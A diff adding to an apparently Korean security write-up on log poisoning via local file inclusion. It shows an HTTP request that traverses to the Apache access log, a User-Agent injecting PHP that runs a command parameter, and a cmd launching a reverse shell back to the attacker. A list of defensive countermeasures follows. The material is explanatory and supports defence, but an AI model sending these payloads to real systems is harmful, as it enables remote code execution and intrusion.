@@ -45,3 +45,20 @@ GET /victim.com/lifendpoint?view=../../../../var/log/apache2/access.log&cmd=wget
 
 User-Agent: <?php system($_GET['cmd']; ?)>
 ```
+
+```
+GET /victim.com/lifendpoint?view=../../../../var/log/apache2/access.log&cmd=php reverse.php
+
+'''
+
+User-Agent: <?php system($_GET['cmd']; ?)>
+```
+이를 통해 악성스크립트가 실행되며, 공격자 서버로의 Reverse Connection이 이루어지게된다.
+
+# 대응방안
+1. 로그 파일에 기록되는 이벤트 필터링을 통해, 정상적은 형식과 속성인지 검증 과정이 존재해야 한다.
+2. 로그 파일을 암호화 하여, 외부에서의 데이터 변경 및 조작을 방지한다.
+3. 로그 파일에 대한 접근 제어 및 권한부여를 통해 외부에서 데이터 변경 및 조작을 방지한다.
+4. 실시간 모니터링을 통한 이상 징후를 탐지한다.
+5. 정기적으로 로그파일에 대해 백업 및 무결성 검사를 실시한다.
+6. 사용자 입력값에 대해 비정상적인 입력값이 들어오는지에 대한 입력값 검증이 필요하다.
